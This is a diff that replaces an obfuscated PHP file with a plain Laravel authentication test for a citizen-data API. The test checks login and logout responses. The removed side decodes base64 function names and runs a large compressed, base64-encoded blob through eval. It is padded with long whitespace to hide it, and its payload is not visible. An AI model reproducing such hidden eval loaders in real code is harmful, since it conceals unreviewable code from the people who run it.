@@ -1,561 +1,134 @@
-<?php 
-        $__='printf';$_='Loading tests/Feature/Layanan/AuthenticationTest.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtW92PmkoUf9/k/g/70MQ2vWn5qG3IZh8EBcWVrujCwEsDjCsqIBUQ4a+/Z0C3u62717Gbm9yGQ1iDzpk5c87vfMxZvbys6c03oOtWvFlE6X3rqnrc03UrnSVp8lGeOWm2mX28cQoncqKPnSz1Z1G68Jx0sY6mMOZD7MeXUuAkyYcPH1pXF/u5L/+6aK7mOve6IGC8fEW6/uWdFmKFxDLZha30rlvVWz/QexLtHeb6sqGGGmroz6SWFxoMRmo2UAzOMvO1Kgv3qFh9qYMmRM06XH9rVNVQQw011FBDDTXUUEP/N2raGQ011FBDfy61XCeZff70Dc+8NZ61rhqNNNRQQw011NBv0dNvUXTHa00K275rGqWnyEt7It7ZSGM8dqfYpkz+rRKgnpw7xk7ESF9/zZlhdxyzHnc3HyMxRz12aytGAuPHttleYVNnHYb13VCPvXD15TDWUIwS9zWveu1pPrz3pV5bSyyklYOezGLFD9xIjy1OZhxTyKqxkhjM+noA85UDWQ88Xu/C+ADmJfzzgdSZe31j4SrBcqDYrBtqFe+gX42dYlNbwn7KqSJEjvlpPRwzQ8Iz6CeatOhU/ORW+yqMF7dupAWDLgPP+tpBo/Q2ErceP16rheB7ymqLl72thQzGkYTE5XDsLrxkID+dq77x0guNFegE5JETtegIt4tONCoHvDbt7LSulY+mK14rO7k28ZLDXh7dEdij9Hi89cJxBDK9H0jebrQcMdrUim46+31Ut4iHU5Bh/vi9zgrWB5sKGej6iHzMe6J3G6nMHa/7uG+Uw+4gH0mrF8dOIm3rBoCPyFgCT2FPfPeI7LVOOZhX6dWyH9XRo7G83vaUu5/29csNNhz/6xgL6YwXBgvAa+AV3vx2+mlu5i/y7OWVlxYHOmMFxuXSAGx7Mu/e5ge+5DmdHNn31uGMDJ22/8drgV+IMbEx4oJMLfIX9VvdMnOKXJENuLPQ4CS7PeZzw2BzkhwP4+XUmtDoSmPAtizYZ2MjMXDNIHHM1HcDYYP7HVp593Ni3wGsIC5lPOl0WfY2gHXFe9vMKey29+29zyFeDRxOTin0dsCNb7NCbMvC0kLq6nR+EVNgLHNB105BYSOuvQVdbhCvBVZoJNhks5nZo8H1GpsqxHFM7LqyzJ3vGmBvc8fCPiMqvHAx5I0A/AN8UpFTiP80cvg2dzY+84dceJLuTrOJWu8D8pLqnxGbfAcwg57OQROnAheJPpbJd9L82KPjhXoAR2DL+3rtAY0dvoMu48rnAQuOEhQWnR0f8bXv4fYdMheVXSHWhCTft6Oz9cdBfRHKDOJqWWjiJNQBmRPKmc3S6P5ETFV702NbCTZEP55iQGxVv1umnNU1i+jS6enHXA6X0Nip8hnH1GOIhxmJH5CHyJ5XDqqwxzoSnc0grxagtxPtdLoPYk4uIDZktol9r56f1hf5KpYZwn4OqvhIYnIO9Vju8lR+xIBNIpA7QZy8IRhEvOiTmpfKl+v4HmOoEV6z5nB5lcSIe8iJPjXuuHYMPu3PTHlNXX8Y5/AFG6i5FpgqF5EzlnzvQG57Tb1V+RHOaWfobItITFeM3OWo4inUXXLs0vgiYM4yWR9T8UAe5Y2MKk5GY5p9FLg4Yw+yUNqmGrh9I3WjwH9NW0LsLSD28Q7kqDNiSgk+Cef1EVWNQ2oCGh1jEpM5qM2k142pHmesoXY6Z9+Ry+22D/Ui5GWqPMFpPuk3UOGMxE+k37umkUE+ZunqgHRBtdbhnAA6cqoadkdZd8glJrVKpMWvgtUXPkeTI/PLTPz1YMs+86NH0RdZK9zFViGG2GwvsRJs3YXIkN6THkJ8UYxV3bNpdx/3UYYP/Qnxy1M59MImOZFrl/akI8AzAzmuvJm2IU9qzFDythYS4xve2t1wpNc037p1Tyi6kY7GzciCs5mtGBnIRvBe4VItR4VW3uWj6ZgbdXttrfTykUTZv/k5b+x19Ox+xr/6AuwLcrcWeJE+3fv9Wut2dsOXxw49TsjueL3Aplb19obPn5cjixNWL9XJKscGMC+ck4zjtcAZtr/jjboHAz5tcwKLpXl8WH/2NCassELOBJ/mtxM4lyB9PYSzAubH0XDCvK8/a0uzu2A1lKu6lLX7xmYKdS3Up4UzXX+2w6AgvT0yHupOUvtmtrSq+5K/3xvcYjSusAV+cTSeqUzV8wR8BJ8h9sUkD9c4USXbhBoTDeazQq97ShGzoOz5pbch4A9qYCzvz6XFvBh1O2f7I/EXlzeY1/ZBMifgZ26yzHO91Kr3DDViPAvr3vC+n7oYhwbUz0YxWORH+SwOcN8/+B/U2n0xcUzNr/cnfCf+8DN20eRlDDzre9OD7KLQHcdwr69bVxcX/31z/7p6fbt/endFw/6I9xTGNz8WfNsif1t/Pyzb/NayuV7jt5ZPsfb2CbhrqL27+gcI3Ofx';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace Tests\Feature\Api\Auth;
+
+use App\Models\PendudukMandiri;
+use Tests\TestCase;
+
+class AuthenticationTest extends TestCase
+{
+    public function testSuccessLogin()
+    {
+        $response = $this->post('/api/v1/auth/login', [
+            'credential' => '3275014601977005',
+            'password' => '111111',
+        ]);
+
+        $response
+            ->assertStatus(200)
+            ->assertJsonStructure([
+                'data' => [
+                    'type',
+                    'id',
+                    'attributes' => [
+                        'access_token' => [
+                            'token',
+                            'token_type',
+                            'expires_in',
+                        ],
+                        'dasar' => [
+                            'nik',
+                            'nama',
+                            'status_kepemilikan_ktp' => [
+                                'wajib_ktp',
+                                'ktp_el',
+                                'status_rekam',
+                                'tag_id_card',
+                            ],
+                            'no_kk',
+                            'no_kk_sebelumnya',
+                            'hubungan_dalam_keluarga',
+                            'jenis_kelamin',
+                            'agama',
+                            'status_penduduk',
+                        ],
+                        'kelahiran' => [
+                            'akta_kelahiran',
+                            'tempat_lahir',
+                            'tanggal_lahir',
+                            'jenis_kelahiran',
+                            'kelahiran_anak_ke',
+                            'penolong_kelahiran',
+                            'berat_lahir',
+                            'panjang_lahir',
+                        ],
+                        'pendidikan_pekerjaan' => [
+                            'pendidikan_kk',
+                            'pendidikan_sedang_ditempuh',
+                            'pekerjaan',
+                        ],
+                        'kewarganegaraan' => [
+                            'warga_negara',
+                            'no_paspor',
+                            'tanggal_akhir_paspor',
+                            'no_kitas',
+                        ],
+                        'orang_tua' => [
+                            'nik_ayah',
+                            'nama_ayah',
+                            'nik_ibu',
+                            'nama_ibu',
+                        ],
+                        'alamat' => [
+                            'no_telepon',
+                            'email',
+                            'alamat',
+                            'dusun',
+                            'rt',
+                            'rw',
+                            'alamat_sebelumnya',
+                        ],
+                        'perkawinan' => [
+                            'status',
+                            'akta',
+                            'tanggal',
+                        ],
+                        'kesehatan' => [
+                            'golongan_darah',
+                            'cacat',
+                            'sakit_menahun',
+                            'kb',
+                            'status_kehamilan',
+                            'asuransi',
+                        ],
+                    ],
+                ],
+            ]);
+    }
+
+    public function testFailedLoginCredential()
+    {
+        $response = $this->post('/api/v1/auth/login', [
+            'credential' => '327501460197700',
+            'password' => '12345',
+        ]);
+
+        $response
+            ->assertStatus(401)
+            ->assertJsonStructure([
+                'code',
+                'messages',
+            ]);
+    }
+
+    public function testSuccesslogout()
+    {
+        $token = auth('jwt')->tokenById(PendudukMandiri::first()->id_pend);
+
+        $response = $this->post('/api/v1/auth/logout', [], [
+            'Authorization' => "Bearer {$token}",
+        ]);
+
+        $response->assertStatus(200);
+    }
+
+    public function testFailedlogout()
+    {
+        $response = $this->post('/api/v1/auth/logout', [], [
+            'Authorization' => "Bearer",
+            'Accept' => 'application/json',
+        ]);
+
+        $response->assertStatus(401);
+    }
+}
